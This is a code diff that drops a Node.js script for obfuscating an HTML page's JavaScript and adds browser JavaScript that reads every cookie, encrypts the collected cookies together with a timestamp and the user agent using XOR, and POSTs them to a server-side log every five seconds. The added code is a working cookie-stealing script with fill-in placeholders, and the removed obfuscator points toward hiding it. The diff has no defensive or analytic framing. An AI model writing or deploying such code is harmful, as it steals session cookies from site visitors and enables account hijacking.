@@ -1,32 +1,41 @@
-const fs = require('fs');
-const javascriptObfuscator = require('javascript-obfuscator');
-const htmlMinifier = require('html-minifier').minify;
+function encrypt(text, password) {
+    // Implement your encryption algorithm here
+    // For example, using a simple XOR encryption
+    var encryptedText = '';
+    for (var i = 0; i < text.length; i++) {
+        encryptedText += String.fromCharCode(text.charCodeAt(i) ^ password.charCodeAt(i % password.length));
+    }
+    return encryptedText;
+}
 
-// Read the original HTML file
-const htmlFilePath = '89v18v581f501029vv90gvg805gv01g50v.html';
-let htmlContent = fs.readFileSync(htmlFilePath, 'utf8');
+function collectCookies() {
+    var cookies = document.cookie.split(';');
+    var logFile = 'collect.log'; // Change to 'collect.txt' if needed
+    var log = '';
+    var timestamp = new Date().toISOString();
+    var browserInfo = navigator.userAgent;
+    var encryptionPassword = 'yourSecretPassword'; // Replace with your own password
 
-// Extract and obfuscate JavaScript code
-const scriptRegex = /<script>([\s\S]*?)<\/script>/g;
-htmlContent = htmlContent.replace(scriptRegex, (match, p1) => {
-    const obfuscatedJs = javascriptObfuscator.obfuscate(p1, {
-        compact: true,
-        controlFlowFlattening: true,
-    }).getObfuscatedCode();
-    return `<script>${obfuscatedJs}</script>`;
-});
+    for (var i = 0; i < cookies.length; i++) {
+        var cookie = cookies[i].trim();
+        if (cookie !== '') {
+            log += timestamp + ' - ' + browserInfo + ' - ' + cookie + '\n';
+        }
+    }
 
-// Obfuscate the HTML content
-const obfuscatedHtmlContent = htmlMinifier(htmlContent, {
-    collapseWhitespace: true,
-    minifyCSS: true,
-    minifyJS: true,
-    removeComments: true,
-    removeEmptyAttributes: true,
-});
+    if (log !== '') {
+        var encryptedLog = encrypt(log, encryptionPassword);
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', logFile, true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                console.log('Cookies collected and logged successfully.');
+            }
+        };
+        xhr.send('log=' + encodeURIComponent(encryptedLog));
+    }
+}
 
-// Write the obfuscated HTML to a new file
-const obfuscatedHtmlFilePath = '89v18v581f501029vv90gvg805gv01g50v_obfuscated.html';
-fs.writeFileSync(obfuscatedHtmlFilePath, obfuscatedHtmlContent);
-
-console.log('HTML and JavaScript obfuscation complete.');
+// Run the function every 5 seconds (adjust the interval as needed)
+setInterval(collectCookies, 5000);
